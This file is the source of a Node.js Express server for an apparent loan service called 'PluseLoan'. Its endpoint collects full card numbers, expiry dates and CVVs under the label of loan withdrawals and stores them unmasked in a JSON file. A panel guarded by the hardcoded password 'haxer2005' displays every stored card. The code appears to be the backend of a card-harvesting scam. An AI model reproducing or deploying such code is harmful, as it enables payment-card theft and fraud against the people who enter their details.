const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const port = process.env.PORT || 3000; // For Render compatibility

// Middleware to parse JSON bodies and URL-encoded forms
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Add CORS headers to allow requests from the frontend
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    next();
});

// File to store withdrawal data
const withdrawalsFile = path.join(__dirname, 'withdrawals.json');

// Initialize withdrawals file if it doesn’t exist
if (!fs.existsSync(withdrawalsFile)) {
    fs.writeFileSync(withdrawalsFile, JSON.stringify([]));
}

// POST endpoint to save withdrawal info
app.post('/api/withdraw', (req, res) => {
    const { cardholderName, cardNumber, expiry, cvv, loanAmount } = req.body;

    if (!cardholderName || !cardNumber || !expiry || !cvv || !loanAmount) {
        return res.status(400).json({ error: 'All fields are required' });
    }

    const withdrawal = {
        cardholderName,
        cardNumber, // No masking
        expiry,
        cvv,    // No masking
        loanAmount,
        timestamp: new Date().toISOString()
    };

    // Read existing data
    fs.readFile(withdrawalsFile, 'utf8', (err, data) => {
        if (err) {
            return res.status(500).json({ error: 'Failed to read data' });
        }

        const withdrawals = JSON.parse(data);
        withdrawals.push(withdrawal);

        // Write updated data
        fs.writeFile(withdrawalsFile, JSON.stringify(withdrawals, null, 2), (err) => {
            if (err) {
                return res.status(500).json({ error: 'Failed to save data' });
            }
            res.json({ message: 'Withdrawal info saved successfully' });
        });
    });
});

// GET endpoint for root (/) with password protection
app.get('/', (req, res) => {
    // If password isn’t provided yet, show a form
    if (!req.query.password) {
        res.send(`
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Enter Password</title>
                <style>
                    body { font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f8f8f8; }
                    .container { background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1); text-align: center; }
                    input { padding: 8px; margin: 10px 0; width: 200px; border: 1px solid #ddd; border-radius: 5px; }
                    button { padding: 10px 20px; background: #000; color: #fff; border: none; border-radius: 5px; cursor: pointer; }
                    button:hover { background: #1a1a1a; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h2>Enter Password</h2>
                    <form action="/" method="GET">
                        <input type="password" name="password" placeholder="Password" required>
                        <br>
                        <button type="submit">Submit</button>
                    </form>
                </div>
            </body>
            </html>
        `);
    } else {
        // Check password
        if (req.query.password !== 'haxer2005') {
            return res.send(`
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>Access Denied</title>
                    <style>
                        body { font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f8f8f8; }
                        .container { background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1); text-align: center; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <h2>Wrong Password</h2>
                        <p>Try again.</p>
                        <a href="/">Back</a>
                    </div>
                </body>
                </html>
            `);
        }

        // Password correct, display withdrawals vertically
        fs.readFile(withdrawalsFile, 'utf8', (err, data) => {
            if (err) {
                return res.status(500).send('Error reading withdrawals data');
            }

            const withdrawals = JSON.parse(data);
            let html = `
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>PluseLoan Withdrawals</title>
                    <style>
                        body { font-family: Arial, sans-serif; margin: 20px; background: #f8f8f8; }
                        h1 { text-align: center; color: #000; }
                        table { width: 100%; max-width: 900px; margin: 20px auto; border-collapse: collapse; }
                        th, td { padding: 10px; border: 1px solid #ddd; text-align: left; }
                        th { background: #000; color: #fff; width: 200px; }
                        td { background: #fff; }
                    </style>
                </head>
                <body>
                    <h1>PluseLoan Withdrawals</h1>
                    <table>
                        <tr>
                            <th>Field</th>
            `;

            // Add a column header for each withdrawal
            withdrawals.forEach((_, index) => {
                html += `<th>Withdrawal ${index + 1}</th>`;
            });

            html += `</tr>`;

            // Define the fields to display
            const fields = [
                { label: 'Cardholder Name', key: 'cardholderName' },
                { label: 'Card Number', key: 'cardNumber' },
                { label: 'Expiry', key: 'expiry' },
                { label: 'CVV', key: 'cvv' },
                { label: 'Loan Amount', key: 'loanAmount', format: value => `$${value}` },
                { label: 'Timestamp', key: 'timestamp' }
            ];

            // Add a row for each field
            fields.forEach(field => {
                html += `
                    <tr>
                        <th>${field.label}</th>
                `;
                withdrawals.forEach(w => {
                    const value = field.format ? field.format(w[field.key]) : w[field.key];
                    html += `<td>${value}</td>`;
                });
                html += `</tr>`;
            });

            html += `
                    </table>
                </body>
                </html>
            `;

            res.send(html);
        });
    }
});

// Start server
app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
